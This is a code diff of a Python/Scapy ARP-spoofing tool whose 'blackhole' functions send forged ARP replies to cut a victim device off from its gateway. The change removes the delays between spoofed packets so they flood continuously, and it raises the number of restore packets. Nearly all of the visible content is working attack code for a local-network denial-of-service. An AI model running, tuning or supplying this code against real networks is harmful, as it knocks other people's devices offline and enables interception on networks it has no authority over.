@@ -41,14 +41,12 @@ def spoofMac():
 def reverse_blackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac):
 	if opt == 1:
 		packet = ARP(op=2, psrc=gateway_ipv4, hwsrc=gateway_mac, pdst=victim_ipv4, hwdst=victim_mac)
-		for i in range(5):
+		for i in range(20):
 			send(packet, verbose = False)
-			sleep(2)
 	else:
 		packet = ARP(op=2, psrc=victim_ipv4, hwsrc=victim_mac, pdst=gateway_ipv4, hwdst=gateway_mac)
-		for i in range(5):
+		for i in range(20):
 			send(packet, verbose = False)
-			sleep(2)
 	print('\n\n')		
 	cprint('Restored. Enjoy. Exiting...', 'yellow', attrs = ['bold'])
 	print('\n\n')
@@ -78,7 +76,6 @@ def blackhole(ip_mac):
 			try:
 				while True:
 					send(packet, verbose = False)
-					sleep(2)
 			except KeyboardInterrupt:
 				print('\n\n')
 				cprint("Stopped Blackholing. Restoring network...", 'blue', attrs = ['bold'])
@@ -89,7 +86,6 @@ def blackhole(ip_mac):
 			try:
 				while True:
 					send(packet, verbose = False)
-					sleep(2)
 			except KeyboardInterrupt:
 				print('\n\n')
 				cprint("Stopped Blackholing. Restoring network...", 'blue', attrs = ['bold'])
